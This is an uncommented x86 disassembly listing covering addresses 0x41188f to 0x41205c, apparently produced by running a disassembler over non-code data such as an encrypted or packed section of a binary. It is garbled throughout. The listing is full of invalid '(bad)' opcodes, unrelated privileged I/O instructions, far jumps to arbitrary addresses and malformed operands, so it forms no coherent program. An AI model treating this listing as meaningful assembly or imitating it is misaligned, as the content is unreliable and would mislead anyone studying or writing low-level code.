  41188f:	adc    edi,DWORD PTR [ebx+eiz*1+0x1d69ad64]
  411896:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  411898:	cli    
  411899:	cmp    al,BYTE PTR [ecx+0x56]
  41189c:	and    DWORD PTR [esi-0x2e925e48],ebp
  4118a2:	test   DWORD PTR [edx-0x43],eax
  4118a5:	add    BYTE PTR [edi-0x6c],cl
  4118a8:	call   0xc4b44531
  4118ad:	mov    DWORD PTR ds:0x89335088,ebx
  4118b3:	add    al,0xa5
  4118b5:	das    
  4118b6:	das    
  4118b7:	rcl    ch,0xc2
  4118ba:	icebp  
  4118bb:	ds icebp 
  4118bd:	sub    al,0x77
  4118bf:	div    DWORD PTR [ebx]
  4118c1:	mov    BYTE PTR [esi],bl
  4118c3:	jbe    0x411915
  4118c5:	test   ecx,ecx
  4118c7:	cmp    ebx,0x4df4b1cb
  4118cd:	add    eax,DWORD PTR [eax-0x7c5c5fc5]
  4118d3:	ds out dx,eax
  4118d5:	add    al,0x87
  4118d7:	aad    0x3e
  4118d9:	mov    edi,DWORD PTR [esi-0x74a5142d]
  4118df:	sbb    al,0xd8
  4118e1:	jmp    DWORD PTR ds:0xaf5b4123
  4118e7:	push   es
  4118e8:	jp     0x411880
  4118ea:	out    0x58,al
  4118ec:	retf   
  4118ed:	aam    0x29
  4118ef:	lock cmp esi,ebx
  4118f2:	pop    ebp
  4118f4:	add    eax,0xc9e3ceed
  4118f9:	test   dh,0x5e
  4118fc:	popf   
  4118fd:	scas   eax,DWORD PTR es:[edi]
  4118fe:	cmp    al,0xe7
  411900:	arpl   WORD PTR [edx+0x42],dx
  411903:	fisttp QWORD PTR cs:[esi+0x1f66af9f]
  41190a:	xor    DWORD PTR [edi],esi
  41190c:	imul   eax,DWORD PTR [esi+0x35],0x4f3c608c
  411913:	push   ebp
  411914:	fnsave [ebp+0x9]
  411917:	mov    dl,bh
  411919:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41191b:	pushf  
  41191c:	(bad)  
  41191d:	mov    edi,DWORD PTR [esi+ebp*1]
  411920:	inc    edx
  411921:	jnp    0x4118e9
  411923:	mov    WORD PTR [eax-0x57],ds
  411926:	lds    esi,FWORD PTR [ebp+0x40]
  411929:	aaa    
  41192a:	mov    ebx,0xa943d409
  41192f:	cmp    eax,0x392b782f
  411934:	jnp    0x4118ef
  411936:	jge    0x4118b9
  411938:	in     al,dx
  411939:	mov    ch,0x61
  41193b:	add    al,bh
  41193d:	mov    ebp,0xdbe9800a
  411942:	imul   ecx,DWORD PTR [eax],0xffffff90
  411945:	imul   edx,ecx,0xf3211442
  41194b:	push   0x2a
  41194d:	mov    ebp,0xe1fe0a92
  411952:	out    dx,al
  411953:	jbe    0x41198f
  411955:	or     bh,BYTE PTR [edx]
  411957:	or     BYTE PTR [ebp+0x381abde9],0x79
  41195e:	push   eax
  41195f:	and    DWORD PTR [esi],ecx
  411961:	scas   eax,DWORD PTR es:[edi]
  411962:	push   ebp
  411963:	mov    BYTE PTR [ebx+0x4d],dl
  411966:	sbb    ecx,DWORD PTR [ecx]
  411968:	xchg   edi,eax
  411969:	fbstp  TBYTE PTR ds:0xd7e95ee6
  41196f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411970:	xor    bh,0x81
  411973:	dec    ebp
  411974:	sbb    DWORD PTR [esi-0x6d],esp
  411977:	mov    cl,0x24
  411979:	cmp    BYTE PTR [ebp-0x38],bl
  41197c:	sahf   
  41197d:	adc    al,0xb8
  41197f:	lods   al,BYTE PTR ds:[esi]
  411980:	pop    ecx
  411981:	jle    0x4119b8
  411983:	push   ebx
  411984:	mov    ds:0x43eb342e,al
  411989:	cmp    al,0x22
  41198b:	shl    ebx,cl
  41198d:	adc    al,0x60
  41198f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411990:	xchg   ecx,eax
  411991:	push   ss
  411992:	xor    al,0xe2
  411994:	or     bl,ah
  411996:	cmp    edx,DWORD PTR [edi+eax*1-0x74]
  41199a:	xchg   ecx,eax
  41199b:	cwde   
  41199c:	outs   dx,DWORD PTR ds:[esi]
  41199d:	add    ebp,DWORD PTR [ebx-0x1ea06ea]
  4119a3:	fwait
  4119a4:	std    
  4119a5:	cli    
  4119a6:	pop    ecx
  4119a7:	ja     0x411985
  4119a9:	retf   
  4119aa:	xchg   ebp,eax
  4119ab:	cmc    
  4119ac:	jnp    0x411a13
  4119ae:	jl     0x4119db
  4119b0:	popf   
  4119b1:	ret    
  4119b2:	clc    
  4119b3:	rol    ebp,0xd9
  4119b6:	popa   
  4119b7:	repnz mov ds:0x460050ad,eax
  4119bd:	jge    0x4119bd
  4119bf:	outs   dx,BYTE PTR ds:[esi]
  4119c0:	jp     0x4119a9
  4119c2:	cmp    eax,0xf9311997
  4119c7:	inc    esi
  4119c8:	aad    0x4b
  4119ca:	test   al,0x59
  4119cc:	pop    sp
  4119ce:	push   ds
  4119cf:	js     0x4119b8
  4119d1:	jge    0x4119a6
  4119d3:	adc    al,0x4e
  4119d5:	enter  0xa38f,0xc5
  4119d9:	mov    dh,BYTE PTR [esi+eiz*1-0x6a97c2c7]
  4119e0:	adc    DWORD PTR [ebp+0x20],ebx
  4119e3:	fiadd  WORD PTR [eax-0x47]
  4119e6:	mov    ah,0x4d
  4119e8:	out    dx,eax
  4119e9:	push   0x3
  4119eb:	pop    ebx
  4119ec:	inc    ebx
  4119ed:	xchg   ebx,ecx
  4119ef:	jmp    0x413d7d
  4119f4:	popf   
  4119f5:	add    eax,0xa840804
  4119fa:	xchg   ecx,eax
  4119fb:	adc    bl,0x9b
  4119fe:	pop    eax
  4119ff:	in     al,dx
  411a00:	leave  
  411a01:	les    esi,FWORD PTR [bx-0x75f5]
  411a06:	add    DWORD PTR [ebx-0x7c7ca1f4],0x25
  411a0d:	bound  esp,QWORD PTR [edi+0x693392b9]
  411a13:	mov    dh,0xc8
  411a15:	mov    al,ds:0x8d86058d
  411a1a:	stos   DWORD PTR es:[edi],eax
  411a1b:	(bad)  [edi]
  411a1d:	jo     0x411a45
  411a1f:	ins    DWORD PTR es:[edi],dx
  411a20:	imul   edx,DWORD PTR [ebp+eiz*1+0x1d],0x9f116130
  411a28:	arpl   di,bp
  411a2a:	sar    cl,0x4d
  411a2d:	sar    BYTE PTR [edi+0x4b891633],cl
  411a33:	fadd   QWORD PTR [ecx+0x58ec880f]
  411a39:	inc    eax
  411a3a:	pop    ebx
  411a3b:	push   edx
  411a3c:	xlat   BYTE PTR ds:[ebx]
  411a3d:	dec    edi
  411a3e:	int    0xe8
  411a40:	(bad)  
  411a42:	cmp    BYTE PTR [esi-0x29],ah
  411a45:	test   BYTE PTR [ebx+0x1ed27b34],cl
  411a4b:	fdivr  DWORD PTR [edx-0x71a56e15]
  411a51:	mov    ss,WORD PTR [edi-0x3f]
  411a54:	jl     0x411acc
  411a56:	cld    
  411a57:	or     BYTE PTR [edi+eax*4-0x6188d192],bl
  411a5e:	adc    eax,0xdbb7db9
  411a63:	pushf  
  411a64:	jbe    0x411a99
  411a66:	fsub   QWORD PTR [eax+0x42]
  411a69:	std    
  411a6a:	mov    eax,ds:0x7e3f0d05
  411a6f:	rol    DWORD PTR [edi],1
  411a71:	or     eax,DWORD PTR [ebx]
  411a73:	and    BYTE PTR [ecx+ebp*4+0x2600aee4],ah
  411a7a:	in     eax,dx
  411a7b:	hlt    
  411a7c:	std    
  411a7d:	bound  ebp,QWORD PTR [ecx+0x6b8e4b04]
  411a83:	add    ch,BYTE PTR [esi]
  411a85:	xchg   ebx,eax
  411a86:	retf   0x2a0d
  411a89:	push   edx
  411a8a:	sbb    DWORD PTR ds:0x1e6ef9b6,eax
  411a90:	leave  
  411a91:	mov    esp,0xd4ea7425
  411a96:	ins    DWORD PTR es:[edi],dx
  411a97:	jp     0x411b0f
  411a99:	push   ebp
  411a9a:	popa   
  411a9b:	mov    al,ds:0x288272f2
  411aa0:	fldenv [eax+0x26]
  411aa3:	or     al,0xde
  411aa5:	jmp    0xedf7ba44
  411aaa:	jb     0x411a3d
  411aac:	aad    0x5
  411aae:	jmp    0x411b2f
  411ab0:	mov    cl,0xe2
  411ab2:	shl    BYTE PTR [edi-0x78d2548d],0xc3
  411ab9:	jmp    FWORD PTR [eax]
  411abb:	mov    ebx,0x9cb166c7
  411ac0:	call   0x86fa6360
  411ac5:	push   ecx
  411ac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ac7:	aaa    
  411ac8:	stos   BYTE PTR es:[edi],al
  411ac9:	outs   dx,BYTE PTR ds:[esi]
  411aca:	xchg   edi,eax
  411acb:	xor    al,0x8e
  411acd:	jle    0x411b4d
  411acf:	dec    edi
  411ad0:	sbb    ecx,DWORD PTR [edi+0x4d4f6a53]
  411ad6:	repz push eax
  411ad8:	cmp    al,0x4d
  411ada:	pop    es
  411adb:	call   0xd327f4fa
  411ae0:	xchg   DWORD PTR [eax+0x2b],ebp
  411ae3:	aaa    
  411ae4:	mov    dh,0x4c
  411ae6:	cmc    
  411ae7:	mov    ?,WORD PTR [eax+edx*8-0x60]
  411aeb:	fwait
  411aec:	mov    ecx,0x81b0f652
  411af1:	fild   DWORD PTR [eax]
  411af3:	outs   dx,BYTE PTR ds:[esi]
  411af4:	imul   edx,DWORD PTR [ecx+eax*2],0xffffff93
  411af8:	jmp    0x9061:0xd9fa0eff
  411aff:	repnz xchg ecx,eax
  411b01:	aad    0xbc
  411b03:	ret    0x981
  411b06:	lock jno 0x411a99
  411b09:	mov    ds:0x7ff4d2c,al
  411b0e:	retf   0xe73f
  411b11:	es and al,0xbe
  411b14:	out    dx,eax
  411b15:	aaa    
  411b16:	bound  edi,QWORD PTR [eax]
  411b18:	dec    edi
  411b19:	pop    eax
  411b1a:	cdq    
  411b1b:	or     eax,0x98164bec
  411b20:	test   eax,0x592ea726
  411b25:	xchg   DWORD PTR [eax-0x2a483549],esi
  411b2b:	call   0x96f6:0x41bfbe5a
  411b32:	les    esi,FWORD PTR [ebp-0x5f]
  411b35:	repz xor esi,ebp
  411b38:	lds    ecx,FWORD PTR [edx]
  411b3a:	push   ecx
  411b3b:	jp     0x411ac2
  411b3d:	in     al,dx
  411b3e:	stc    
  411b3f:	enter  0xd80,0xa4
  411b43:	je     0x411ae9
  411b45:	in     eax,dx
  411b46:	push   edi
  411b47:	out    0x8c,eax
  411b49:	loop   0x411b10
  411b4b:	mov    eax,0x31a9e412
  411b50:	dec    esp
  411b51:	clc    
  411b52:	mov    ah,0x32
  411b54:	(bad)  
  411b55:	repz inc esi
  411b57:	(bad)  
  411b59:	cmp    dh,dh
  411b5b:	pusha  
  411b5c:	ret    0xc7f0
  411b5f:	mov    al,ds:0xff5efa54
  411b64:	iret   
  411b65:	scas   eax,DWORD PTR es:[edi]
  411b66:	jnp    0x411b1f
  411b68:	test   eax,0x88d2eb7f
  411b6d:	jae    0x411b8f
  411b6f:	xlat   BYTE PTR ds:[ebx]
  411b70:	and    eax,0xda971290
  411b75:	jne    0x411b02
  411b77:	cld    
  411b78:	stos   DWORD PTR es:[edi],eax
  411b79:	data16 xor dh,BYTE PTR [ebx]
  411b7c:	xlat   BYTE PTR ds:[ebx]
  411b7d:	clc    
  411b7e:	bound  esp,QWORD PTR [esi+0x650b70c6]
  411b84:	pop    ebx
  411b85:	cmp    DWORD PTR [ecx],edi
  411b87:	dec    ebx
  411b88:	xchg   ebx,eax
  411b89:	inc    ecx
  411b8a:	inc    edi
  411b8b:	(bad)  
  411b8c:	pop    ebx
  411b8d:	sti    
  411b8e:	sbb    bh,BYTE PTR [edx]
  411b90:	xor    al,0x5d
  411b92:	add    bh,ah
  411b94:	idiv   BYTE PTR [esi+0x75fd4c5d]
  411b9a:	mov    ds,WORD PTR [edi-0x14]
  411b9d:	test   al,0x43
  411b9f:	and    edi,DWORD PTR [edi]
  411ba1:	add    eax,0x27135b88
  411ba6:	jnp    0x411b6d
  411ba8:	or     dh,BYTE PTR [edx+0x733fae74]
  411bae:	mov    WORD PTR [eax+0x59],ss
  411bb1:	mov    ah,BYTE PTR [ecx-0x2deb1426]
  411bb7:	sub    esi,DWORD PTR [ecx+0x42]
  411bba:	dec    edx
  411bbb:	std    
  411bbc:	pusha  
  411bbd:	(bad)  
  411bbe:	into   
  411bbf:	adc    esi,DWORD PTR [edi-0x15]
  411bc2:	lock fs sbb al,bh
  411bc6:	(bad)
  411bc9:	dec    esp
  411bca:	jl     0x411bbe
  411bcc:	leave  
  411bcd:	or     BYTE PTR [esi-0x6e],bh
  411bd0:	mov    dh,0xae
  411bd2:	in     eax,dx
  411bd3:	adc    al,0x13
  411bd5:	fadd   st(3),st
  411bd7:	jns    0x411b89
  411bd9:	aas    
  411bda:	inc    esp
  411bdb:	mov    edi,0x28762e61
  411be0:	js     0x411bb0
  411be2:	and    bl,BYTE PTR [edx-0x24]
  411be5:	add    BYTE PTR [edx],ch
  411be7:	call   0x8232222c
  411bec:	ins    BYTE PTR es:[edi],dx
  411bed:	inc    eax
  411bee:	out    0xb0,eax
  411bf0:	rol    BYTE PTR [eax+0x31279b8d],1
  411bf6:	test   DWORD PTR [ecx+ebx*8-0x7be67188],esi
  411bfd:	sub    DWORD PTR ds:0xd7aaf47c,edi
  411c03:	push   ds
  411c04:	xchg   ebp,eax
  411c05:	fsubr  QWORD PTR [ecx-0x7af8db73]
  411c0b:	mov    cl,0xd8
  411c0d:	fnsave [esi-0x662901c5]
  411c13:	push   ds
  411c14:	(bad)
  411c17:	scas   eax,DWORD PTR es:[edi]
  411c18:	shr    ebp,cl
  411c1a:	nop
  411c1b:	sub    eax,0xf21fac35
  411c20:	aas    
  411c21:	adc    eax,0x8ea1e0e3
  411c26:	mov    cl,0xcd
  411c28:	iret   
  411c29:	sub    BYTE PTR [ebp+0x21],ah
  411c2c:	or     al,0xa1
  411c2e:	fistp  DWORD PTR [edx-0x5e]
  411c31:	or     dl,BYTE PTR [esi+0x59]
  411c34:	inc    ecx
  411c35:	adc    esp,DWORD PTR [ecx]
  411c37:	cli    
  411c38:	clc    
  411c39:	jl     0x411c4e
  411c3b:	ror    BYTE PTR [ebp-0x50],cl
  411c3e:	js     0x411c00
  411c40:	shl    BYTE PTR [esi+0x774eb53c],1
  411c46:	fucomip st,st(7)
  411c48:	or     dh,BYTE PTR [ecx]
  411c4a:	das    
  411c4b:	icebp  
  411c4c:	pop    ebx
  411c4d:	in     al,dx
  411c4e:	sbb    cl,BYTE PTR [edx+0x2e]
  411c51:	push   edi
  411c52:	dec    edi
  411c53:	jnp    0x411bf2
  411c55:	cmp    DWORD PTR [eax],0x35
  411c58:	push   ds
  411c59:	mov    al,0xc6
  411c5b:	mov    BYTE PTR [edx+0x11066891],ch
  411c61:	sbb    BYTE PTR [eax],ch
  411c63:	jp     0x411c53
  411c65:	xchg   BYTE PTR [ebx],dh
  411c67:	iret   
  411c68:	icebp  
  411c69:	mov    al,ds:0x33f43305
  411c6e:	sbb    BYTE PTR [edx-0x919659e],al
  411c74:	shr    DWORD PTR [esi+eiz*8+0x60],cl
  411c78:	sub    al,0xf2
  411c7a:	mov    bl,0x3f
  411c7c:	mov    esp,0xecc0d9fd
  411c81:	mov    ebp,fs
  411c83:	imul   esi,edi,0xffffff87
  411c86:	cmp    dl,BYTE PTR [edx+0x63]
  411c89:	lahf   
  411c8a:	xor    eax,0x945c030b
  411c8f:	std    
  411c90:	xchg   DWORD PTR [edi],edi
  411c92:	outs   dx,BYTE PTR ds:[esi]
  411c93:	xchg   DWORD PTR [ecx],esp
  411c95:	test   eax,0xee088c0c
  411c9a:	nop
  411c9b:	sub    eax,0x9aba6d13
  411ca0:	retf   
  411ca1:	popa   
  411ca2:	fwait
  411ca3:	sbb    al,BYTE PTR [esi+0x6aeb3f30]
  411ca9:	int3   
  411caa:	cpuid  
  411cac:	outs   dx,BYTE PTR ds:[esi]
  411cad:	jmp    0xb34adf5a
  411cb2:	outs   dx,BYTE PTR ds:[esi]
  411cb3:	(bad)  
  411cb4:	(bad)  [edi+ebx*8-0x57]
  411cb8:	daa    
  411cb9:	inc    esp
  411cba:	mov    dl,bh
  411cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cbd:	js     0x411d0d
  411cbf:	add    esp,DWORD PTR [eax-0x7e]
  411cc2:	jnp    0x411d3d
  411cc4:	xchg   esp,eax
  411cc5:	dec    eax
  411cc6:	int    0xdb
  411cc8:	pop    eax
  411cc9:	dec    ebx
  411cca:	fsubr  st(1),st
  411ccc:	rcl    DWORD PTR [ecx-0x5020d9d4],0x5b
  411cd3:	dec    ebp
  411cd4:	pop    es
  411cd5:	push   esp
  411cd6:	sub    cl,BYTE PTR [eax+0x9949766]
  411cdc:	sbb    ecx,esi
  411cde:	push   ecx
  411cdf:	imul   esp,esi,0x73
  411ce2:	push   ecx
  411ce3:	cld    
  411ce4:	and    eax,0x9f265108
  411ce9:	mov    ah,0xb9
  411ceb:	dec    esi
  411cec:	out    0xcb,al
  411cee:	add    eax,0x57621d6e
  411cf3:	sub    ebp,ecx
  411cf5:	mov    ecx,0xb7a8e819
  411cfa:	imul   ebx,DWORD PTR [ecx],0xec7b1b15
  411d00:	push   edi
  411d01:	xchg   esi,eax
  411d02:	mov    ebp,0x38bcb0c6
  411d07:	pop    ebp
  411d08:	inc    esp
  411d09:	pop    eax
  411d0a:	sahf   
  411d0b:	xchg   esp,eax
  411d0c:	mov    ds:0xc96c6236,eax
  411d11:	stos   BYTE PTR es:[edi],al
  411d12:	ret    
  411d13:	dec    ebp
  411d14:	jg     0x411ce5
  411d16:	jl     0x411caa
  411d18:	adc    eax,0x6db29ece
  411d1d:	push   ds
  411d1e:	(bad)  
  411d1f:	call   0x661bb59b
  411d24:	xchg   esp,eax
  411d25:	xchg   edi,eax
  411d26:	dec    edx
  411d27:	sub    esp,DWORD PTR [ecx-0x18074b63]
  411d2d:	jl     0x411cb4
  411d2f:	mov    cl,BYTE PTR [ecx-0x79]
  411d32:	sbb    eax,0x5a0702fe
  411d37:	push   0xbe77adab
  411d3c:	(bad)  
  411d3e:	sub    edi,esi
  411d40:	push   ds
  411d41:	xchg   ecx,eax
  411d42:	xchg   ecx,eax
  411d43:	adc    edi,DWORD PTR [esp+ebp*1]
  411d46:	inc    edx
  411d47:	cs out 0x39,eax
  411d4a:	test   DWORD PTR [ecx+ebp*8+0x42],0x602474bb
  411d52:	sti    
  411d53:	sbb    bh,BYTE PTR [edi]
  411d55:	fsubr  DWORD PTR [ecx+0xcace985]
  411d5b:	push   edi
  411d5c:	push   ecx
  411d5d:	pop    esp
  411d5e:	pop    esp
  411d5f:	test   al,0xd4
  411d61:	or     eax,0xea444d7c
  411d66:	dec    edx
  411d67:	lods   al,BYTE PTR ds:[esi]
  411d68:	cmp    ah,dh
  411d6a:	in     al,0xf5
  411d6c:	mov    eax,0xc0b08cdb
  411d71:	or     ebp,esi
  411d73:	xor    ch,BYTE PTR [edx+eiz*8-0x5]
  411d77:	in     eax,0xee
  411d79:	cwde   
  411d7a:	lock loopne 0x411dc9
  411d7d:	sbb    DWORD PTR [ebx],esp
  411d7f:	cmp    BYTE PTR [ecx-0x2f875d84],al
  411d85:	ss jmp 0xbdef:0x1e15f84d
  411d8d:	mov    dh,0xf9
  411d8f:	inc    edi
  411d90:	adc    cl,0xb7
  411d93:	imul   ebp,DWORD PTR [edi-0x60de040d],0xffffffc9
  411d9a:	imul   esp,DWORD PTR [eax],0x9a7f9945
  411da0:	jns    0x411e00
  411da2:	mov    al,ds:0xffcf96a3
  411da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411da8:	xchg   ebp,eax
  411da9:	outs   dx,DWORD PTR ds:[esi]
  411daa:	sub    eax,0xb21d3ad9
  411daf:	push   ecx
  411db0:	test   BYTE PTR [esi],cl
  411db2:	ficomp WORD PTR [edi]
  411db4:	(bad)  
  411db5:	(bad)  
  411db6:	sahf   
  411db7:	popf   
  411db8:	hlt    
  411db9:	cmp    al,0x5
  411dbb:	sub    BYTE PTR [edx-0x4b2c30f7],0x7b
  411dc2:	inc    edi
  411dc3:	sub    al,0xc6
  411dc5:	jo     0x411de9
  411dc7:	aam    0xb1
  411dc9:	mov    eax,ds:0xee5e9ec2
  411dce:	push   es
  411dcf:	pop    ebx
  411dd0:	mov    cl,0x2a
  411dd2:	inc    ecx
  411dd3:	jne    0x411dde
  411dd5:	add    BYTE PTR [ebx+0xa8873ac],cl
  411ddb:	call   0x739fc6f4
  411de0:	jge    0x411e36
  411de2:	mov    ebx,0x1a956260
  411de7:	dec    edx
  411de8:	dec    di
  411dea:	and    eax,0xda091660
  411def:	push   ds
  411df0:	ds pop edi
  411df2:	fs fstp st(4)
  411df5:	mov    dl,0x8
  411df7:	dec    esi
  411df8:	mov    ah,0x19
  411dfa:	dec    eax
  411dfb:	imul   esp,DWORD PTR [edx+0x6ae1c2b1],0x765f46e0
  411e05:	add    edx,DWORD PTR [esi+edx*1+0x5b41ae66]
  411e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e0d:	sub    dh,BYTE PTR [edx-0xae23469]
  411e13:	stos   DWORD PTR es:[edi],eax
  411e14:	or     al,0x4
  411e16:	sub    al,0x34
  411e18:	adc    al,BYTE PTR [ebx+0x42254ed4]
  411e1e:	pop    DWORD PTR [edi-0x195bdd72]
  411e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e25:	mov    bh,0xcc
  411e27:	add    al,0x4b
  411e29:	mov    WORD PTR [eax-0x91cfbe0],ds
  411e2f:	in     al,dx
  411e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e31:	fisttp WORD PTR [ebx+0x73be9500]
  411e37:	cli    
  411e38:	loop   0x411ddd
  411e3a:	loope  0x411de9
  411e3c:	cwde   
  411e3d:	dec    esi
  411e3e:	jmp    0x8bb1:0xb6e277bb
  411e45:	xlat   BYTE PTR ds:[ebx]
  411e46:	mov    WORD PTR [ecx+0x71a09d42],es
  411e4c:	mov    ds:0x7798db0c,al
  411e51:	mov    esi,gs
  411e53:	pop    ebx
  411e54:	imul   ecx,DWORD PTR ds:0x5c0e6b6,0xffffffe2
  411e5b:	mov    eax,ds:0x98cf4d
  411e60:	push   edi
  411e61:	cld    
  411e62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e63:	add    esp,DWORD PTR ds:0x37a660a0
  411e69:	xlat   BYTE PTR ds:[ebx]
  411e6a:	cmp    al,0x6b
  411e6c:	retf   
  411e6d:	aam    0x3d
  411e6f:	jns    0x411e4a
  411e71:	inc    esi
  411e72:	dec    ebx
  411e73:	mov    bh,0x7a
  411e75:	(bad)  [ebp+0x56]
  411e78:	adc    BYTE PTR [esi-0x1c5ea447],0x31
  411e7f:	dec    edi
  411e80:	add    BYTE PTR [ebx-0x5cbdba05],cl
  411e86:	dec    ebx
  411e87:	test   eax,0x3600e389
  411e8c:	jne    0x411e9d
  411e8e:	retf   
  411e8f:	sbb    eax,ebx
  411e91:	sbb    eax,0xe1dfa09f
  411e96:	leave  
  411e97:	sbb    BYTE PTR [ebx-0x23],dl
  411e9a:	mov    al,0xfa
  411e9c:	sub    DWORD PTR [esi+0x2f995ba4],eax
  411ea2:	add    DWORD PTR [esi+0x5],edx
  411ea5:	into   
  411ea6:	out    dx,al
  411ea7:	mov    ecx,0x9420befb
  411eac:	outs   dx,DWORD PTR ds:[esi]
  411ead:	pushf  
  411eae:	add    bl,0xc9
  411eb1:	sub    al,0xa7
  411eb3:	jp     0x411ee1
  411eb5:	and    esp,DWORD PTR [bx]
  411eb8:	jbe    0x411ec8
  411eba:	or     eax,0xd251e4d9
  411ebf:	xchg   ebx,eax
  411ec0:	clc    
  411ec1:	(bad)  
  411ec2:	mov    esp,0xb5d74b95
  411ec7:	push   ds
  411ec8:	out    dx,eax
  411ec9:	test   eax,0x3f04915a
  411ece:	neg    DWORD PTR [eax]
  411ed0:	jns    0x411efd
  411ed2:	popa   
  411ed3:	(bad)  [ecx-0x69f1a303]
  411ed9:	scas   eax,DWORD PTR es:[edi]
  411eda:	cmp    bl,BYTE PTR [ebp-0xb75dfc8]
  411ee0:	inc    esi
  411ee1:	sbb    eax,0x56b91912
  411ee6:	in     eax,0x62
  411ee8:	sub    eax,0xcbee556c
  411eed:	mov    ecx,0x9e68c9f4
  411ef2:	sbb    eax,0x8a024cc4
  411ef7:	or     bl,BYTE PTR [ebp+ebp*2-0x5058b504]
  411efe:	(bad)  
  411eff:	fild   WORD PTR [ebp-0x79]
  411f02:	mov    ?,WORD PTR [edi+0x32]
  411f05:	jecxz  0x411f5a
  411f07:	ss popa 
  411f09:	cs xchg ebp,eax
  411f0b:	adc    edx,DWORD PTR [esi+eiz*4]
  411f0e:	pop    ecx
  411f0f:	loopne 0x411f71
  411f11:	dec    esi
  411f12:	and    eax,0x9543a7dc
  411f17:	leave  
  411f18:	pop    ds
  411f19:	mov    ds:0x25dd3c1,eax
  411f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f1f:	xor    bh,ah
  411f21:	fist   DWORD PTR [ebp-0x74c84d09]
  411f27:	adc    BYTE PTR [ebp+0x4307f973],ch
  411f2d:	mov    al,ds:0xfa63a89b
  411f32:	cmp    ebx,eax
  411f34:	sub    al,0x8e
  411f36:	pop    ecx
  411f37:	pop    eax
  411f38:	mov    ecx,0x5df04fa
  411f3d:	gs cdq 
  411f3f:	xchg   esp,eax
  411f40:	add    DWORD PTR [eax+0x75],0xffffffd4
  411f44:	mov    bl,0xfc
  411f46:	cwde   
  411f47:	fisub  DWORD PTR ds:0x34c23a3d
  411f4d:	test   DWORD PTR [esi-0x7e7393e9],edx
  411f53:	(bad)  
  411f54:	cmp    al,0xfa
  411f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f57:	mov    ah,0xd2
  411f59:	sub    DWORD PTR [ecx+0x19143731],ecx
  411f5f:	xchg   ecx,eax
  411f60:	retf   
  411f61:	dec    edi
  411f62:	adc    ebx,0x2
  411f65:	pop    ss
  411f66:	xchg   edx,eax
  411f67:	outs   dx,BYTE PTR ds:[esi]
  411f68:	xor    dl,BYTE PTR [edi+ebx*2+0x52d70aaf]
  411f6f:	ficomp DWORD PTR [ecx+0x102d709d]
  411f75:	mov    cl,0x8b
  411f77:	retf   0xde59
  411f7a:	adc    edx,0xdd682342
  411f80:	ret    0x9786
  411f83:	and    ebp,eax
  411f85:	das    
  411f86:	popf   
  411f87:	and    eax,0xf899516b
  411f8c:	or     edx,DWORD PTR [ebp+0x2b796d44]
  411f92:	loop   0x411f3f
  411f94:	adc    esi,0xffffffd3
  411f97:	ror    DWORD PTR [ebp+0xa74ea6],0x7e
  411f9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f9f:	or     cl,cl
  411fa1:	aaa    
  411fa2:	inc    esp
  411fa3:	(bad)  
  411fa5:	xlat   BYTE PTR ds:[ebx]
  411fa6:	dec    edx
  411fa7:	mov    eax,ds:0x6fc861c9
  411fac:	dec    edi
  411fad:	mov    al,ds:0xdaaeae4b
  411fb2:	adc    DWORD PTR [ebx+ebp*4+0x71],ebp
  411fb6:	and    edi,DWORD PTR [esi]
  411fb8:	call   0xced377d2
  411fbd:	retf   
  411fbe:	out    dx,eax
  411fbf:	jl     0x412009
  411fc1:	sbb    dh,al
  411fc3:	xchg   esi,eax
  411fc4:	jnp    0x411fe4
  411fc6:	cld    
  411fc7:	push   edi
  411fc8:	pop    edi
  411fc9:	jl     0x411fd5
  411fcb:	(bad)  
  411fcc:	aas    
  411fcd:	ja     0x411f91
  411fcf:	pop    eax
  411fd0:	xor    al,0xf4
  411fd2:	dec    esp
  411fd3:	add    eax,0xa4aa5411
  411fd8:	fs ss or al,0x5c
  411fdc:	leave  
  411fdd:	rcr    BYTE PTR [esi-0x15b85b9b],cl
  411fe3:	push   ds
  411fe4:	aam    0xec
  411fe6:	nop    DWORD PTR [ebx-0x1f]
  411fea:	scas   al,BYTE PTR es:[edi]
  411feb:	mov    ebx,0x8f3eb43d
  411ff0:	or     eax,DWORD PTR [esi-0x59b65b41]
  411ff6:	cs (bad) 
  411ff8:	and    bh,cl
  411ffa:	scas   eax,DWORD PTR es:[edi]
  411ffb:	mov    edi,0x5c094e57
  412000:	cwde   
  412001:	pop    esi
  412002:	out    dx,al
  412003:	mov    DWORD PTR [edi+0xc],edi
  412006:	iret   
  412007:	cmp    al,0x8
  412009:	pop    ebx
  41200b:	sub    eax,0x8ff59b51
  412010:	mov    edx,0xde275a27
  412015:	outs   dx,BYTE PTR ds:[esi]
  412016:	shr    eax,1
  412018:	call   0xab15:0xb327f799
  41201f:	dec    ecx
  412020:	or     eax,0xaafaf018
  412025:	ja     0x412045
  412027:	mov    esi,0xe11d3569
  41202c:	popf   
  41202d:	aaa    
  41202e:	ins    BYTE PTR es:[edi],dx
  41202f:	cli    
  412030:	mov    dh,0x2a
  412032:	add    DWORD PTR [edi+ecx*4-0x1625f356],ecx
  412039:	fs cmp al,0xbe
  41203c:	retf   
  41203d:	pop    esi
  41203e:	cmp    al,0x73
  412040:	sahf   
  412041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412042:	sub    eax,0xc59ecf33
  412047:	rol    BYTE PTR [esi],cl
  412049:	jle    0x41207b
  41204b:	pop    esi
  41204c:	cmc    
  41204d:	or     ebx,DWORD PTR [ecx]
  41204f:	or     eax,0x86fa2f57
  412054:	ins    BYTE PTR es:[edi],dx
  412055:	pop    ecx
  412056:	ss loop 0x41202e
  412059:	lods   eax,DWORD PTR ds:[esi]
  41205a:	loopne 0x412020
  41205c:	stos   DWORD PTR es:[edi],eax
